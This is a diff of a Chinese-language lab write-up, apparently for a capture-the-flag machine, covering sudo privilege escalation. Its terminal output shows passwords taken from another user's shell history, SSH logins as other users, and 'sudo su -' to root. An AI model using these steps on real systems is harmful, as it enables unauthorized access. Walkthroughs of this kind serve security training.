@@ -1121,6 +1121,9 @@ pwd
 
 # Post-Exploitation
 ## 1. sudo提权
+<details>
+<summary>通过查看ps发现一个JKanode的用户执行了多个进程，所以查看一下这个用户的家目录发现历史执行命令，进而发现连个ssh连接记录和密码，然后peter用户能够执行sudo命令，直接可以切换到root</summary>
+
 ```shell
 SHayslett@red:~$ ps -ef
 UID        PID  PPID  C STIME TTY          TIME CMD
@@ -1371,24 +1374,18 @@ exit
 sodu -l
 sudo -l
 exit
-
 SHayslett@red:/home/JKanode$ ssh JKanode@localhost
 -----------------------------------------------------------------
 ~          Barry, don't forget to put a message here           ~
 -----------------------------------------------------------------
 JKanode@localhost's password:
 Welcome back!
-
-
 JKanode@red:~$ sudo -l
-
 We trust you have received the usual lecture from the local System
 Administrator. It usually boils down to these three things:
-
     #1) Respect the privacy of others.
     #2) Think before you type.
     #3) With great power comes great responsibility.
-
 [sudo] password for JKanode:
 Sorry, user JKanode may not run sudo on red.
 JKanode@red:~$ exit
@@ -1400,27 +1397,20 @@ SHayslett@red:/home/JKanode$ ssh peter@localhost
 -----------------------------------------------------------------
 peter@localhost's password:
 Welcome back!
-
-
 red% sudo -l
-
 We trust you have received the usual lecture from the local System
 Administrator. It usually boils down to these three things:
-
     #1) Respect the privacy of others.
     #2) Think before you type.
     #3) With great power comes great responsibility.
-
 [sudo] password for peter:
 Matching Defaults entries for peter on red:
     lecture=always, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
-
 User peter may run the following commands on red:
     (ALL : ALL) ALL
 red% sudo -l
 Matching Defaults entries for peter on red:
     lecture=always, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
-
 User peter may run the following commands on red:
     (ALL : ALL) ALL
 red% sudo su -
@@ -1463,11 +1453,10 @@ drwxr-xr-x  2 root root  4096 Jun  4  2016 .vim
  '--------'  (   o  O    o)
               `----------`
 b6b545dc11b7a270f4bad23432190c75162c4a2b
-
 ➜  ~
-
-
 ```
+</details>
+
 ## 2. 内核提权
 <details>
 <summary>linepeas跑一下</summary>
